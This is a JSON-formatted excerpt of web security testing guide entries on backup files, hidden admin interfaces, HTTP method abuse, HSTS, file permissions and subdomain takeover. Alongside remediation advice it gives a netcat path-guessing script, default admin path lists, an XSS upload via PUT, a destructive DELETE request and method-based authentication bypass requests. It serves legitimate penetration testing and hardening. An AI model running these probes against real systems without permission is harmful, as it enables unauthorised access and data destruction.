        "summary": "<h3>Summary</h3><p>While most of the files within a web server are directly handled by the server itself, it isn’t uncommon to find unreferenced or forgotten files that can be used to obtain important information about the infrastructure or the credentials.</p><p>Most common scenarios include the presence of renamed old versions of modified files, inclusion files that are loaded into the language of choice and downloaded as source, and even automatic or manual backups in the form of compressed archives. Backup files can also be generated automatically by the underlying file system the application is hosted on, a feature usually referred to as “snapshots”.</p><p>All these files may grant the tester access to inner workings, back doors, administrative interfaces, or even credentials to connect to the administrative interface or the database server.</p><p>An important source of vulnerability is found in files unrelated to the application. These files may be created when editing application files, creating on-the-fly backup copies, or leaving old or unreferenced files in the web tree. Performing in-place editing or other administrative actions on production web servers may inadvertently leave backup copies, either generated automatically by the editor while editing files, or by the administrator who is zipping a set of files to create a backup.</p><p>It is easy to forget such files and this may pose a serious security threat to the application. It happens because backup copies may be generated with file extensions differing from those of the original files. A .tar , .zip or .gz archive that we generate (and might forget) has obviously a different extension, and the same happens with automatic copies created by many editors (for example, emacs generates a backup copy named file~ when editing file ). Making a copy manually can produce a similar effect, such as when ‘file’ is copied as ‘file.old’. The underlying file system the application is on could be making snapshots of your application at different points in time without your knowledge, which may also be accessible via the web, posing a similar but different backup file style threat to your application.</p><p>As a result, these activities generate files that are not needed by the application and may be handled differently than the original file by the web server. For example, if we make a copy of login.asp and name it login.asp.old without proper security measures, it could potentially allow users to download the source code of login.asp. This is because login.asp.old will be typically served as text or plain, rather than being executed because of its extension. In other words, accessing login.asp causes the execution of the server-side code of login.asp , while accessing login.asp.old causes the content of login.asp.old (which is, again, server-side code) to be plainly returned to the user and displayed in the browser. This may pose security risks, since sensitive information may be revealed.</p><p>Generally, exposing server-side code is a bad idea. Not only are you unnecessarily exposing business logic, but you may be unknowingly revealing application-related information which may help an attacker (path names, data structures, etc.). Not to mention the fact that there are too many scripts with embedded username and password in clear text (which is a careless and extremely dangerous practice).</p><p>Other causes of unreferenced files are due to design or configuration choices when they allow diverse kind of application-related files such as data files, configuration files, log files, to be stored in file system directories that can be accessed by the web server. These files have normally no reason to be in a file system space that could be accessed via web, since they should be accessed only at the application level, by the application itself (and not by the casual user browsing around).</p><p>Old, backup and unreferenced files present various threats to the security of a web application:</p><ul><li>Unreferenced files may disclose sensitive information that can facilitate a focused attack against the application; for example, include files containing database credentials, configuration files containing references to other hidden content, absolute file paths, etc.</li><li>Unreferenced pages may contain powerful functionality that can be used to attack the application; for example, an administration page that is not linked from published content but can be accessed by any user who knows where to find it.</li><li>Old and backup files may contain vulnerabilities that have been fixed in more recent versions; for example,viewdoc.old.jspmay contain a directory traversal vulnerability that has been fixed inviewdoc.jspbut can still be exploited by anyone who finds the old version.</li><li>Backup files may disclose the source code for pages designed to execute on the server; for example, requestingviewdoc.bakmay return the source code forviewdoc.jsp, which can be reviewed for vulnerabilities that may be difficult to find by making blind requests to the executable page. While this threat applies to scripting languages such as Perl, PHP, ASP, shell scripts, JSP, etc., it is not limited to them, as shown in the example provided in the next point.</li><li>Backup archives may contain copies of all files within (or even outside) the webroot. This allows an attacker to quickly enumerate the entire application, including unreferenced pages, source code, include files, etc. For example, if you forget a file namedmyservlets.jar.oldcontaining a backup copy of your servlet implementation classes, you are exposing a lot of sensitive information which can be decompiled and reverse engineered.</li><li>In some cases, copying or editing a file modifies the filename but leaves the file extension intact. This is common in Windows environments, where file copying operations generate filenames prefixed with “Copy of “ or localized versions of this string. Since the file extension is left unchanged, this is not a case where an executable file is returned as plain text by the web server, and therefore not a case of source code disclosure. However, these files are dangerous too because there is a chance that they include obsolete and incorrect logic that, when invoked, could trigger application errors, which might yield valuable information to an attacker if diagnostic message display is enabled.</li><li>Log files may contain sensitive information about the activities of application users, for example, sensitive data passed in URL parameters, session IDs, URLs visited (which may disclose additional unreferenced content), etc. Other log files (e.g. ftp logs) may contain sensitive information about the maintenance of the application by system administrators.</li><li>File system snapshots may contain copies of the code that contain vulnerabilities that have been fixed in more recent versions. For example,/.snapshot/monthly.1/view.phpmay contain a directory traversal vulnerability that has been fixed in/view.phpbut can still be exploited by anyone who finds the old version.</li></ul><h3>Test Objectives</h3><ul><li>Find and analyse unreferenced files that might contain sensitive information.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Testing for unreferenced files uses both automated and manual techniques, and typically involves a combination of the following:</p><p>Enumerate all of the application’s pages and functionality. This can be done manually using a browser, or using an application spidering tool. Most applications use a recognizable naming scheme, and organize resources into pages and directories using words that describe their function. It is often possible to infer the name and location of unreferenced pages from the naming scheme used for published content. For example, if a page titled viewuser.asp is found, one should also look for edituser.asp, adduser.asp, and deleteuser.asp. Similarly, if a directory /app/user is discovered, one should also search for /app/admin and /app/manager.</p><p>Many web applications leave clues in published content that can lead to the discovery of hidden pages and functionality. These clues can often be found in the source code of HTML and JavaScript files. The source code for all published content should be manually reviewed to identify clues about other pages and functionality. For example:</p><p>Programmers’ comments and commented-out sections of source code may refer to hidden content:</p><pre><code><!-- <A HREF=\"uploadfile.jsp\">Upload a document to the server</A> --> <!-- Link removed while bugs in uploadfile.jsp are fixed          --></code></pre><p>JavaScript may contain page links that are only rendered within the user’s GUI under certain circumstances:</p><pre><code>var adminUser = false ; if ( adminUser ) menu . add ( new menuItem ( \" Maintain users \" , \" /admin/useradmin.jsp \" ));</code></pre><p>HTML pages may contain FORMs that have been hidden by disabling the SUBMIT element:</p><pre><code><form action= \"forgotPassword.jsp\" method= \"post\" > <input type= \"hidden\" name= \"userID\" value= \"123\" > <!-- <input type=\"submit\" value=\"Forgot Password\"> --> </form></code></pre><p>Another source of clues about unreferenced directories is the /robots.txt file used to provide instructions to web robots:</p><pre><code>User-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include</code></pre><p>In its simplest form, this involves running a list of common filenames through a request engine in an attempt to guess files and directories that exist on the server. The following netcat wrapper script will read a wordlist from stdin and perform a basic guessing attack:</p><pre><code>#!/bin/bash server = example.org port = 80 while read url do echo -ne \" $url \\t \" echo -e \"GET / $url HTTP/1.0 \\n Host: $server \\n \" | netcat $server $port | head -1 done | tee outputfile</code></pre><p>Depending upon the server, GET may be replaced with HEAD for faster results. The output file specified can be grepped for “interesting” response codes. The response code 200 (OK) usually indicates that a valid resource has been found (provided the server does not deliver a custom “not found” page using the 200 code). But also look out for 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) and 500 (Internal error), which may also indicate resources or directories that are worthy of further investigation.</p><p>The basic guessing attack should be run against the webroot, and also against all directories that have been identified through other enumeration techniques. More advanced/effective guessing attacks can be performed as follows:</p><ul><li>Identify the file extensions in use within known areas of the application (e.g. JSP, ASPX, HTML), and use a basic wordlist appended with each of these extensions (or use a longer list of common extensions if resources permit).</li><li>For each file identified through other enumeration techniques, create a custom wordlist derived from that filename. Get a list of common file extensions (including ~, bak, txt, src, dev, old, inc, orig, copy, tmp, swp, etc.) and use each extension before, after, and instead of, the extension of the actual filename.</li></ul><p>Note: Windows file copying operations generate filenames prefixed with “Copy of “ or localized versions of this phrase, hence they do not change file extensions. While “Copy of “ files typically do not disclose source code when accessed, they might yield valuable information in case they cause errors when invoked.</p><p>The most obvious way in which a misconfigured server may disclose unreferenced pages is through directory listing. Request all enumerated directories to identify any which provide a directory listing.</p><p>Numerous vulnerabilities have been found in individual web servers which allow an attacker to enumerate unreferenced content, for example:</p><ul><li>Apache ?M=D directory listing vulnerability.</li><li>Various IIS script source disclosure vulnerabilities.</li><li>IIS WebDAV directory listing vulnerabilities.</li></ul><p>Pages and functionality in internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources. There are various sources of these references:</p><ul><li>Pages that used to be referenced may still appear in the archives of internet search engines. For example,1998results.aspmay no longer be linked from a company’s site, but may remain on the server and in search engine databases. This old script may contain vulnerabilities that could be used to compromise the entire site. Thesite:Google search operator may be used to run a query only against the domain of choice, such as in:site:www.example.com. Using search engines in this way has led to a broad array of techniques which you may find useful, and are described in theGoogle Hackingsection of this Guide. Check it to hone your testing skills via Google. Backup files are not likely to be referenced by any other files and therefore may have not been indexed by Google, but if they lie in browsable directories the search engine might know about them.</li><li>In addition, Google and Yahoo keep cached versions of pages found by their robots. Even if1998results.asphas been removed from the target server, a version of its output may still be stored by these search engines. The cached version may contain references to, or clues about, additional hidden content that still remains on the server.</li><li>Content that is not referenced from within a target application may be linked to by third-party sites. For example, an application which processes online payments on behalf of third-party traders may contain a variety of bespoke functionality which can (normally) only be found by following links within the sites of its customers.</li></ul><p>Because deny list filters are based on regular expressions, one can sometimes take advantage of obscure OS filename expansion features which work in ways the developer didn’t expect. The tester can sometimes exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it’s filename conventions.</p><p>Example: Windows 8.3 filename expansion c:\\\\program files becomes C:\\\\PROGRA\\~1</p><ul><li>Remove incompatible characters</li><li>Convert spaces to underscores</li><li>Take the first six characters of the basename</li><li>Add~<digit>which is used to distinguish files with names using the same six initial characters</li><li>This convention changes after the first 3 name collisions</li><li>Truncate file extension to three characters</li><li>Make all the characters uppercase</li></ul><p>Performing gray-box testing against old and backup files necessitates the examination of files within directories that belong to the set of web directories served by the web server(s) comprising the web application infrastructure. Theoretically the examination should be performed by hand to be thorough. However, since in most cases copies of files or backup files tend to be created by using the same naming conventions, the search can be easily scripted. For example, editors leave behind backup copies by naming them with a recognizable extension or ending and humans tend to leave behind files with a .old or similar predictable extensions. A useful strategy would be to periodically schedule a background job to check for files with extensions that are likely to be identified as copies or backup files, while also performing manual checks on a longer time basis.</p>",
        "tools": "<h3>Tools</h3><p>Vulnerability assessment tools tend to include checks to spot web directories having standard names (such as “admin”, “test”, “backup”, etc.), and to report any web directory which allows indexing. If the tester is unable to find directory listing, they should try to check for probable backup extensions. Some tools that can help with this include:</p><ul><li>Nessus</li><li>Nikto2</li></ul><p>Web spider tools</p><ul><li>wget</li><li>Spike proxy includes a site crawler function</li><li>Xenu</li><li>curl</li></ul><p>Some of them are also included in standard Linux distributions. Web development tools usually include facilities to identify broken links and unreferenced files.</p>",
        "remediation": "<h3>Remediation</h3><p>For an effective protection strategy, testing should be combined with a security policy that clearly forbids dangerous practices, including:</p><ul><li>Editing files in-place on the web server or application server file systems. This is a particularly bad habit, since it is likely to generate backup or temporary files by the editors. It is amazing to see how often this is done, even in large organizations. If you absolutely need to edit files on a production system, do ensure that you don’t leave behind anything that is not explicitly intended, and keep in mind that you are doing it at your own risk.</li><li>Carefully check any other activity performed on file systems exposed by the web server, such as spot administration activities. For example, if you occasionally need to take a snapshot of a couple of directories (which you should not do on a production system), you may be tempted to zip them first. Be careful not to leave behind such archive files.</li><li>Appropriate configuration management policies should help prevent obsolete and un-referenced files.</li><li>Applications should be designed not to create (or rely on) files stored under the web directory trees served by the web server. Data files, log files, configuration files, etc. should be stored in directories not accessible by the web server to counter the possibility of information disclosure, not to mention the potential for data modification if web directory permissions allow writing.</li><li>File system snapshots should not be accessible via the web if the document root is on a file system using this technology. Configure your web server to deny access to such directories, for example, under Apache, a location directive like this should be used:</li></ul><pre><code><Location ~ \".snapshot\" > Order deny,allow\n    Deny from all </Location></code></pre>",
        "test_objectives": ""
    },
    "WSTG-CONF-05": {
        "summary": "<h3>Summary</h3><p>Administrator interfaces may be present in the application or on the application server to allow certain users to perform privileged activities on the site. Tests should be undertaken to reveal if and how this privileged functionality can be accessed by an unauthorized or standard user.</p><p>An application may require an administrator interface to enable a privileged user to access functionality that may make changes to how the site functions. Such changes may include:</p><ul><li>user account provisioning</li><li>site design and layout</li><li>data manipulation</li><li>configuration changes</li></ul><p>In many instances, such interfaces do not have sufficient controls to protect them from unauthorized access. Testing is aimed at discovering these administrator interfaces and accessing functionality intended for the privileged users.</p><h3>Test Objectives</h3><ul><li>Identify hidden administrator interfaces and functionality.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The following section describes vectors that may be used to test for the presence of administrative interfaces. These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide (for example, Testing for bypassing authorization schema and Testing for Insecure Direct Object References ) in greater detail.</p><ul><li>Directory and file enumeration: An administrative interface may be present but not visibly available to the tester. The path of the administrative interface may be guessed by simple requests such as /admin or /administrator. In some scenarios, these paths can be revealed within seconds using advanced Google search techniques -Google dorks. There are many tools available to perform brute forcing of server contents, see the tools section below for more information. A tester may have to also identify the filename of the administration page. Forcibly browsing to the identified page may provide access to the interface.</li><li>Comments and links in source code: Many sites use common code that is loaded for all site users. By examining all source sent to the client, links to administrator functionality may be discovered and should be investigated.</li><li>Reviewing server and application documentation: If the application server or application is deployed in its default configuration it may be possible to access the administration interface using information described in configuration or help documentation. Default password lists should be consulted if an administrative interface is found and credentials are required.</li><li>Publicly available information: Many applications, such as WordPress, have administrative interfaces that are available by default.</li><li>Alternative server port: Administration interfaces may be seen on a different port on the host than the main application. For example, Apache Tomcat’s Administration interface can often be seen on port 8080.</li><li>Parameter tampering: A GET or POST parameter, or a cookie may be required to enable the administrator functionality. Clues to this include the presence of hidden fields such as:</li></ul><pre><code><input type= \"hidden\" name= \"admin\" value= \"no\" ></code></pre><p>or in a cookie:</p><p>Cookie: session_cookie; useradmin=0</p><p>Once an administrative interface has been discovered, a combination of the above techniques may be used to attempt to bypass authentication. If this fails, the tester may wish to attempt a brute force attack. In such an instance, the tester should be aware of the potential for administrative account lockout if such functionality is present.</p><p>A more detailed examination of the server and application components should be undertaken to ensure hardening (i.e. administrator pages are not accessible to everyone through the use of IP filtering or other controls), and where applicable, verification that all components do not use default credentials or configurations.\nSource code should be reviewed to ensure that the authorization and authentication model ensures clear separation of duties between normal users and site administrators. User interface functions shared between normal and administrator users should be reviewed to ensure clear separation between the rendering of such components and the information leakage from such shared functionality.</p><p>Each web framework may have its own default admin pages or paths, as in the following examples:</p><p>PHP:</p><pre><code>/phpinfo\n/phpmyadmin/\n/phpMyAdmin/\n/mysqladmin/\n/MySQLadmin\n/MySQLAdmin\n/login.php\n/logon.php\n/xmlrpc.php\n/dbadmin</code></pre><p>WordPress:</p><pre><code>wp-admin/\nwp-admin/about.php\nwp-admin/admin-ajax.php\nwp-admin/admin-db.php\nwp-admin/admin-footer.php\nwp-admin/admin-functions.php\nwp-admin/admin-header.php</code></pre><p>Joomla:</p><pre><code>/administrator/index.php\n/administrator/index.php?option=com_login\n/administrator/index.php?option=com_content\n/administrator/index.php?option=com_users\n/administrator/index.php?option=com_menus\n/administrator/index.php?option=com_installer\n/administrator/index.php?option=com_config</code></pre><p>Tomcat:</p><pre><code>/manager/html\n/host-manager/html\n/manager/text\n/tomcat-users.xml</code></pre><p>Apache:</p><pre><code>/index.html\n/httpd.conf\n/apache2.conf\n/server-status</code></pre><p>Nginx:</p><pre><code>/index.html\n/index.htm\n/index.php\n/nginx_status\n/index.php\n/nginx.conf\n/html/error</code></pre>",
        "tools": "<h3>Tools</h3><p>Several tools can assist in identifying hidden administrator interfaces and functionality, including:</p><ul><li>ZAP - Forced Browseis a currently maintained use of OWASP’s previous DirBuster project.</li><li>THC-HYDRAis a tool that allows brute-forcing of many interfaces, including form-based HTTP authentication.</li><li>A brute forcer is much more effective when it uses a good dictionary, such as theNetsparkerdictionary.</li></ul><h3>References</h3><ul><li>Cirt: Default Password list</li><li>FuzzDB can be used to do brute force browsing admin login path</li><li>Common admin or debugging parameters</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-06": {
        "summary": "<h3>Summary</h3><p>HTTP offers a number of methods (or verbs) that can be used to perform actions on the web server. While GET and POST are by far the most common methods that are used to access information provided by a web server, there are a variety of other methods that may also be supported, and can sometimes be exploited by attackers.</p><p>RFC 7231 defines the main valid HTTP request methods (or verbs), although additional methods have been added in other RFCs, such as RFC 5789 . Several of these verbs have been re-used for different purposes in RESTful applications, listed in the table below.</p><h3>Test Objectives</h3><ul><li>Enumerate supported HTTP methods.</li><li>Test for access control bypass.</li><li>Test HTTP method overriding techniques.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To perform this test, the tester needs a way to identify which HTTP methods are supported by the web server that is being examined. The simplest way to do this is to make an OPTIONS request to the server:</p><pre><code>OPTIONS / HTTP / 1.1 Host : example.org</code></pre><p>The server should then respond with a list of supported methods:</p><pre><code>HTTP / 1.1 200 OK Allow : OPTIONS, GET, HEAD, POST</code></pre><p>However, not all servers may respond to OPTIONS requests, and some may even return inaccurate information. It’s also worth noting that servers may support different methods for different paths. This means that even if a method is not supported for the root / directory, it does not necessarily indicate that the same method won’t be supported elsewhere.</p><p>A more reliable way to test for supported methods is to simply make a request with that method type, and examine the server response. If the method is not permitted, the server should return a 405 Method Not Allowed status.</p><p>Note that some servers treat unknown methods as equivalent to GET , so they may respond to arbitrary methods, such as the request shown below. This can occasionally be useful to evade a web application firewall, or any other filtering that blocks specific methods.</p><pre><code>FOO / HTTP/1.1\nHost: example.org</code></pre><p>Requests with arbitrary methods can also be made using curl with the -X option:</p><pre><code>curl -X FOO https://example.org</code></pre><p>There are also a variety of automated tools that can attempt to determine supported methods, such as the http-methods Nmap script. However, these tools may not test for dangerous methods (i.e., methods that may cause changes such as PUT or DELETE ), or may unintentionally cause changes to the web server if these methods are supported. As such, they should be used with care.</p><p>The PUT and DELETE methods can have different effects, depending on whether they are being interpreted by the web server or by the application running on it.</p><p>Some legacy web servers allowed the use of the PUT method to create files on the server. For example, if the server is configured to allow this, the request below would create a file on the server called test.html with the contents <script>alert(1)</script> .</p><pre><code>PUT /test.html HTTP / 1.1 Host : example.org Content-Length : 25 <script>alert(1)</script></code></pre><p>Similar requests can also be made with cURL:</p><pre><code>curl https://example.org --upload-file test.html</code></pre><p>This allows an attacker to upload arbitrary files to the webserver, which could potentially result in a full system compromise if they are allowed to upload executable code such as PHP files. However, this configuration is extremely rare, and is unlikely to be seen on modern systems.</p><p>Similarly, the DELETE method can be used to delete files from the webserver. Please note that this is a destructive action ; therefore, extreme care should be exercised when testing this method.</p><pre><code>DELETE /test.html HTTP / 1.1 Host : example.org</code></pre><p>Or with cURL:</p><pre><code>curl https://example.org/test.html -X DELETE</code></pre><p>By contrast, the PUT and DELETE methods are commonly used by modern RESTful applications to create and delete objects. For example, the API request below could be used to create a user called “foo” with a role of “user”:</p><pre><code>PUT /api/users/foo HTTP / 1.1 Host : example.org Content-Length : 34 {\n    \"role\": \"user\"\n}</code></pre><p>A similar request with the DELETE method could be used to delete an object.</p><pre><code>DELETE /api/users/foo HTTP / 1.1 Host : example.org</code></pre><p>Although it may be reported by automated scanning tools, the presence of these methods on a RESTful API is not a security issue . However, this functionality may have other vulnerabilities (such as weak access control), and should be thoroughly tested.</p><p>The TRACE method (or Microsoft’s equivalent TRACK method) causes the server to echo back the contents of the request. This led to a vulnerability called Cross-Site Tracing (XST) to be published in 2003 (PDF), which could be used to access cookies that had the HttpOnly flag set. The TRACE method has been blocked in all browsers and plugins for many years; as such, this issue is no longer exploitable. However, it may still be flagged by automated scanning tools, and the TRACE method being enabled on a web server suggests that is has not been properly hardened.</p><p>The CONNECT method causes the web server to open a TCP connection to another system, and then pass traffic from the client to that system. This could allow an attacker to proxy traffic through the server, in order to hide their source address, access internal systems or access services that are bound to localhost. An example of a CONNECT request is shown below:</p><pre><code>CONNECT 192.168.0.1:443 HTTP/1.1\nHost: example.org</code></pre><p>The PATCH method is defined in RFC 5789 , and is used to provide instructions on how an object should be modified. The RFC itself does not define what format these instructions should be in, but various methods are defined in other standards, such as the RFC 6902 - JavaScript Object Notation (JSON) Patch .</p><p>For example, if we have a user called “foo” with the following properties:</p><pre><code>{ \"role\" : \"user\" , \"email\" : \" [email protected] \" }</code></pre><p>The following JSON PATCH request could be used to change the role of this user to “admin”, without modifying the email address:</p><pre><code>PATCH /api/users/foo HTTP / 1.1 Host : example.org { \"op\": \"replace\", \"path\": \"/role\", \"value\": \"admin\" }</code></pre><p>Although the RFC states that it should include instructions for how the object should be modified, the PATCH method is commonly (mis)used to include the changed content instead, as shown below. Much like the previous request, this would change the “role” value to “admin” without modifying the rest of the object. This is in contrast to the PUT method, which would overwrite the entire object, and thus result in an object with no “email” attribute.</p><pre><code>PATCH /api/users/foo HTTP / 1.1 Host : example.org {\n    \"role\": \"admin\"\n}</code></pre><p>As with the PUT method, this functionality may have access control weaknesses or other vulnerabilities. Additionally, applications may not perform the same level of input validation when modifying an object as they do when creating one. This could potentially allow malicious values to be injected (such as in a stored cross-site scripting attack), or could allow broken or invalid objects that may result in business logic related issues.</p><p>If a page on the application redirects users to a login page with a 302 code when they attempt to access it directly, it may be possible to bypass this by making a request with a different HTTP method, such as HEAD , POST or even a made up method such as FOO . If the web application responds with a HTTP/1.1 200 OK rather than the expected HTTP/1.1 302 Found , it may then be possible to bypass the authentication or authorization. The example below shows how a HEAD request may result in a page setting administrative cookies, rather than redirecting the user to a login page:</p><pre><code>HEAD /admin/ HTTP / 1.1 Host : example.org</code></pre><pre><code>HTTP / 1.1 200 OK [...] Set-Cookie : adminSessionCookie=[...];</code></pre><p>Alternatively, it may be possible to make direct requests to pages that cause actions, such as:</p><pre><code>HEAD /admin/createUser.php?username=foo&password=bar&role=admin HTTP / 1.1 Host : example.org</code></pre><p>Or:</p><pre><code>FOO /admin/createUser.php\nHost: example.org\nContent-Length: 36\n\nusername=foo&password=bar&role=admin</code></pre><p>Some web frameworks provide a way to override the actual HTTP method in the request. They achieve this by emulating the missing HTTP verbs and passing some custom headers in the requests. The main purpose of this is to circumvent a middleware application (such as a proxy or web application firewall) which blocks specific methods. The following alternative HTTP headers could potentially be used:</p><ul><li>X-HTTP-Method</li><li>X-HTTP-Method-Override</li><li>X-Method-Override</li></ul><p>To test this, consider scenarios where restricted verbs like PUT or DELETE return a 405 Method not allowed . In such cases, replay the same request, but add the alternative headers for HTTP method overriding. Then, observe the system’s response. The application should respond with a different status code ( e.g. 200 OK ) in cases where method overriding is supported.</p><p>The web server in the following example does not allow the DELETE method and blocks it:</p><pre><code>DELETE /resource.html HTTP / 1.1 Host : example.org</code></pre><pre><code>HTTP / 1.1 405 Method Not Allowed [...]</code></pre><p>After adding the X-HTTP-Method header, the server responds to the request with a 200:</p><pre><code>GET /resource.html HTTP / 1.1 Host : example.org X-HTTP-Method : DELETE</code></pre><pre><code>HTTP / 1.1 200 OK [...]</code></pre>",
        "tools": "<h3>Tools</h3><ul><li>Ncat</li><li>cURL</li><li>Nmap http-methods NSE script</li></ul><h3>References</h3><ul><li>RFC 7231 - Hypertext Transfer Protocol (HTTP/1.1)</li><li>RFC 5789 - PATCH Method for HTTP</li><li>HTACCESS: BILBAO Method Exposed</li><li>Fortify - Misused HTTP Method Override</li><li>Mozilla Developer Network - Safe HTTP Methods</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Ensure that only the required methods are allowed and that these methods are properly configured.</li><li>Ensure that no workarounds are implemented to bypass security measures implemented by user-agents, frameworks, or web servers.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-CONF-07": {
        "summary": "<h3>Summary</h3><p>The HTTP Strict Transport Security (HSTS) feature enables a web server to inform the user’s browser, via a special response header, that it should never establish an unencrypted HTTP connection to the specified domain servers. Instead, it should automatically establish all connection requests to access the site through HTTPS. This also prevents users from overriding certificate errors.</p><p>Considering the importance of this security measure, it is prudent to verify that the site is using this HTTP header in order to ensure that all the data travels encrypted between the web browser and the server.</p><p>The HTTP strict transport security header uses three specific directives:</p><ul><li>max-age: to indicate the number of seconds that the browser should automatically convert all HTTP requests to HTTPS.</li><li>includeSubDomains: to indicate that all related sub-domains must use HTTPS.</li><li>preloadUnofficial: to indicate that the domain(s) are on the preload list(s) and that browsers should never connect without HTTPS.While this is supported by all the major browsers, it is not an official part of the specification. (Seehstspreload.orgfor more information.)</li><li>While this is supported by all the major browsers, it is not an official part of the specification. (Seehstspreload.orgfor more information.)</li></ul><ul><li>While this is supported by all the major browsers, it is not an official part of the specification. (Seehstspreload.orgfor more information.)</li></ul><p>Here’s an example of the HSTS header implementation:</p><p>Strict-Transport-Security: max-age=31536000; includeSubDomains</p><p>The presence of this header must be checked, as its absence could lead to security issues such as:</p><ul><li>Attackers intercepting and accessing the information transferred over an unencrypted network channel.</li><li>Attackers carrying out manipulator-in-the-middle (MITM) attacks by taking advantage of users who accept untrusted certificates.</li><li>Users who mistakenly enter an address in the browser using HTTP instead of HTTPS, or users who click on a link in a web application that incorrectly uses the HTTP protocol.</li></ul><h3>Test Objectives</h3><ul><li>Review the HSTS header and its validity.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Confirm the presence of the HSTS header by examining the server’s response through an intercepting proxy.</li><li>Use curl as follows:</li></ul><pre><code>$ curl -s -D- https://owasp.org | grep -i strict-transport-security:\nStrict-Transport-Security: max-age = 31536000</code></pre><h3>References</h3><ul><li>OWASP HTTP Strict Transport Security</li><li>OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security</li><li>HSTS Specification</li><li>Enable HTTP Strict Transport Security In Apache</li><li>Enable HTTP Strict Transport Security In Nginx</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-08": {
        "summary": "",
        "how-to": "",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-09": {
        "summary": "<h3>Summary</h3><p>When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution, or sensitive user data.</p><p>A clear example would be an executable file that can be run by unauthorized users. For another example, consider account information or a token value used to access an API. These are increasingly seen in modern web services and microservices, and may be stored in a configuration file that has world-readable permissions by default upon installation. Such sensitive data could be exposed either by malicious internal actors within the host system or by remote attackers. The latter may have compromised the service through other vulnerabilities, while gaining only normal user privileges.</p><h3>Test Objectives</h3><ul><li>Review and identify any rogue file permissions.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In Linux, use ls command to check the file permissions. Alternatively, namei can also be used to recursively list file permissions.</p><p>$ namei -l /PathToCheck/</p><p>The files and directories that require file permission testing can include, but are not limited to, the following:</p><ul><li>Web files/directory</li><li>Configuration files/directory</li><li>Sensitive files(encrypted data, password, key)/directory</li><li>Log files(security logs, operation logs, admin logs)/directory</li><li>Executables(scripts, EXE, JAR, class, PHP, ASP)/directory</li><li>Database files/directory</li><li>Temp files/directory</li><li>Upload files/directory</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Windows AccessEnum</li><li>Windows AccessChk</li><li>Linux namei</li></ul><h3>References</h3><ul><li>CWE-732: Incorrect Permission Assignment for Critical Resource</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Set the permissions of the files and directories properly so that unauthorized users cannot access critical resources.</p>",
        "test_objectives": ""
    },
    "WSTG-CONF-10": {
        "summary": "<h3>Summary</h3><p>A successful exploitation of this kind of vulnerability allows an adversary to claim and take control of the victim’s subdomain. This attack relies on the following:</p><p>If the subdomain takeover is successful, a wide variety of attacks are possible (serving malicious content, phishing, stealing user session cookies, credentials, etc.). This vulnerability could be exploited for a wide variety of DNS resource records including: A , CNAME , MX , NS , TXT etc. In terms of the attack severity, an NS subdomain takeover (although less likely) has the highest impact, because a successful attack could result in full control over the whole DNS zone and the victim’s domain.</p><h3>Test Objectives</h3><ul><li>Enumerate all possible domains (previous and current).</li><li>Identify any forgotten or misconfigured domains.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The first step is to enumerate the victim DNS servers and resource records. There are multiple ways to accomplish this task; for example, DNS enumeration using a list of common subdomains dictionary, DNS brute force or using web search engines and other OSINT data sources.</p><p>Using the dig command the tester looks for the following DNS server response messages that warrant further investigation:</p><ul><li>NXDOMAIN</li><li>SERVFAIL</li><li>REFUSED</li><li>no servers could be reached.</li></ul><p>Perform a basic DNS enumeration on the victim’s domain ( victim.com ) using dnsrecon :</p><pre><code>$ ./dnsrecon.py -d victim.com [ * ] Performing General Enumeration of Domain: victim.com\n... [ -] DNSSEC is not configured for victim.com [ * ] A subdomain.victim.com 192.30.252.153 [ * ] CNAME subdomain1.victim.com fictioussubdomain.victim.com\n...</code></pre><p>Identify which DNS resource records are dead and point to inactive/not-used services. Using the dig command for the CNAME record:</p><pre><code>$ dig CNAME fictioussubdomain.victim.com ; << >> DiG 9.10.3-P4-Ubuntu << >> ns victim.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER <<- opcode : QUERY, status: NXDOMAIN, id: 42950\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</code></pre><p>The following DNS responses warrant further investigation: NXDOMAIN .</p><p>To test the A record the tester performs a whois database lookup and identifies GitHub as the service provider:</p><pre><code>$ whois 192.30.252.153 | grep \"OrgName\" OrgName: GitHub, Inc.</code></pre><p>The tester visits subdomain.victim.com or issues a HTTP GET request which returns a “404 - File not found” response which is a clear indication of the vulnerability.</p><p>Figure 4.2.10-1: GitHub 404 File Not Found response</p><br><p>The tester claims the domain using GitHub Pages:</p><p>Figure 4.2.10-2: GitHub claim domain</p><br><p>Identify all nameservers for the domain in scope:</p><pre><code>$ dig ns victim.com +short\nns1.victim.com\nnameserver.expireddomain.com</code></pre><p>In this fictitious example, the tester checks if the domain expireddomain.com is active with a domain registrar search. If the domain is available for purchase the subdomain is vulnerable.</p><p>The following DNS responses warrant further investigation: SERVFAIL or REFUSED .</p><p>The tester has the DNS zone file available, which means DNS enumeration is not necessary. The testing methodology is the same.</p>",
